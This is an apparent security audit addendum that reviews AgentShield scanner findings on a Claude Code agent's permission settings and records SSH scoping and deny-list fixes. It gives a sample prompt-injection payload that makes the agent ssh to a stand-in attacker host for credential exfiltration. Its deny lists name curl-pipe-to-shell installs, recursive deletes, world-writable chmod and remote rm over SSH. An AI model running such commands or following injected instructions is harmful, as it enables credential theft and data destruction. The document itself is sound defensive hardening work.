# Security Audit Addendum — AgentShield Review

**Date:** 2026-04-17
**Scope:** `.claude/` directory (agent-harness configuration)
**Tool:** AgentShield v1.5.0 (`ecc-agentshield`)
**Methodology:** Scanner output interpreted under the brutal-honesty framework from the original audit — no inflated severity, scanner noise separated from genuine issues, exploitability proven or dismissed for each finding mapped to the Claude Code CVE threat model (CVE-2025-59536, CVE-2026-21852).

---

## Summary

| Metric | Initial | Post-fix |
|---|---|---|
| Grade | A (91/100) | **A (90/100)** |
| Permissions subscore | 53/100 | 51/100 |
| Critical findings | 0 | 0 |
| High findings | 3 | 2 (both scanner-noise) |
| Medium findings | 3 | 6 (all scanner-noise or explicitly deferred) |
| Real attack-surface changes | — | 3 material improvements applied |

The one-point grade drop from initial to final is a scanner artifact — AgentShield cannot distinguish `Bash(ssh user@specific-host *)` from `Bash(ssh *)` and penalizes both equally as "unrestricted SSH". Actual attack surface was meaningfully narrowed.

---

## Initial Scan Interpretation

Six findings, of which **three were genuine** and three were duplicates or scanner noise:

| # | Scanner rating | Actual rating | Verdict |
|---|---|---|---|
| 1 | HIGH — `Bash(ssh *)` overly permissive | HIGH | Genuine lateral-movement vector |
| 2 | HIGH — No deny list | MEDIUM-HIGH | Real defense-in-depth gap |
| 3 | HIGH — `Bash(ssh *)` unrestricted network | Duplicate of #1 | Same rule flagged twice under different framing |
| 4 | MEDIUM — No permissions block in `settings.json` | LOW / noise | Scanner misreads Claude Code's shared-vs-local settings split |
| 5 | MEDIUM — No `PreToolUse` hooks in `settings.json` | LOW | Defense-in-depth gap, explicitly deferred for solo-dev workflow |
| 6 | MEDIUM — No `PreToolUse` hooks in `settings.local.json` | Duplicate of #5 | Same in the other file |

---

## Fixes Applied

### Fix A — SSH scoping (`settings.local.json`)

**Before:**
```json
"Bash(ssh *)"
```

**After:**
```json
"Bash(ssh filmglance@147.93.113.39 *)",
"Bash(ssh filmglance@147.93.113.39:*)",
"Bash(scp * filmglance@147.93.113.39:*)"
```

**Exploitability closed:** prompt-injection payload directing the agent to `ssh attacker.example.com "curl -X POST ..."` for credential exfiltration or lateral pivoting now requires an explicit approval prompt. SSH to anywhere other than the known Hostinger VPS no longer auto-runs.

**Trade-off accepted:** future SSH to any new host (e.g., second VPS) triggers one approval prompt; friction is negligible.

**Note on pattern syntax:** Claude Code's schema validator rejected a fourth rule `Bash(scp filmglance@...:* *)` because `:*` may only appear at the end of a pattern. Dropped that rule; incoming `scp` from the VPS will prompt once if ever needed.

### Fix B — Shared deny list (`settings.json`, committed)

Added a `permissions.deny` block to the shared `settings.json`. Entries:

```json
"Bash(git push --force *)",
"Bash(git push -f *)",
"Bash(git reset --hard origin/*)",
"Bash(git reset --hard *)",
"Bash(git config --global *)",
"Bash(curl * | sh)",
"Bash(curl * | bash)",
"Bash(wget * | sh)",
"Bash(wget * | bash)",
"Bash(rm -rf /*)",
"Bash(rm -rf ~*)",
"Bash(chmod 777 *)",
"Bash(chmod -R 777 *)",
"Bash(* > /dev/*)",
"Bash(* >> /dev/*)"
```

**Exploitability closed:** mechanically enforces the CLAUDE.md hard rules (no force push, no hard reset on pushed branches, no global git config). Blocks the canonical supply-chain pattern (`curl | sh`, `wget | sh`) — directly relevant given this session's discussion of shell-pipe installer risk. Blocks catastrophic filesystem wipes, world-writable chmod, and device-file redirects.

**Trade-off accepted:** applies to every machine that clones the repo, which is the point. If any single entry ever becomes friction, it can be removed with a review-visible commit.

### Fix C — Remote-rm via SSH deny (`settings.local.json`)

```json
"deny": [
  "Bash(ssh * \"rm -rf *\")",
  "Bash(ssh * 'rm -rf *')",
  "Bash(ssh * \"sudo rm *\")",
  "Bash(ssh * 'sudo rm *')"
]
```

**Exploitability closed:** even with Fix A restricting SSH to the known VPS, a compromised flow could still ask the agent to `ssh filmglance@147.93.113.39 "rm -rf /root/filmboards-crawl"` during an active import. This denies remote destructive commands via SSH pipe.

**Trade-off accepted:** legitimate remote deletions require explicit approval per invocation. Given the active forum import's dependence on `/root/filmboards-crawl/`, this is a feature.

---

## Residual Findings — All Scanner Limitations

After fixes, 8 findings remain. None represent real security gaps:

### HIGH (2) — scanner can't model host scoping

- `Overly permissive allow rule: Bash(ssh filmglance@147.93.113.39 *)` — AgentShield pattern-matches on "ssh followed by wildcard" and rates both scoped and unscoped patterns as HIGH. It has no concept of host-specific restriction. This is a scanner-design limitation, not a real vulnerability.
- `Overly permissive allow rule: Bash(ssh filmglance@147.93.113.39:*)` — same mechanism.

### MEDIUM (6) — deferred or redundant

| Finding | Why not applied |
|---|---|
| Missing `sudo` deny (`settings.json`) | `sudo` is used legitimately over SSH for VPS privileged ops. Blocking local `sudo` adds no value (Windows doesn't have a native `sudo` command), blocking over SSH would break documented workflows. |
| Missing `ssh` deny (`settings.json`) | Directly contradicts Fix A. Scanner wants us to block SSH entirely; we just scoped it to one host on purpose. |
| No `PreToolUse` hooks (`settings.json`, `settings.local.json`) | Defense-in-depth we deliberately skipped for solo-dev workflow. Base approve-prompt flow + allow/deny lists are sufficient. Revisit if workflow ever grows to multiple contributors. |
| Missing `chmod 777` deny (`settings.local.json`) | Already in `settings.json`. Claude Code merges deny rules across settings sources — duplicating is redundant. Scanner doesn't model the merge. |
| Missing `> /dev/` deny (`settings.local.json`) | Same redundancy — already in `settings.json`. |

---

## Recommendation

Configuration is at a defensible steady state. Further scanner-grade optimization would require either:
- Adding rules that contradict real workflow needs (blocking SSH/sudo entirely)
- Duplicating rules the scanner can't detect are already merged
- Setting up PreToolUse hooks (real value, but real operational cost)

None of these are worth pursuing for the current workflow. Treat AgentShield output as a checklist prompt, not a grade to optimize.

Re-scan before any future change that broadens the allow list (new hosts, new tool surfaces) and re-evaluate.

---

*Artifacts of this audit: `agentshield-report.md` (full AgentShield output, regeneratable via `npx ecc-agentshield scan --format markdown`), this addendum.*
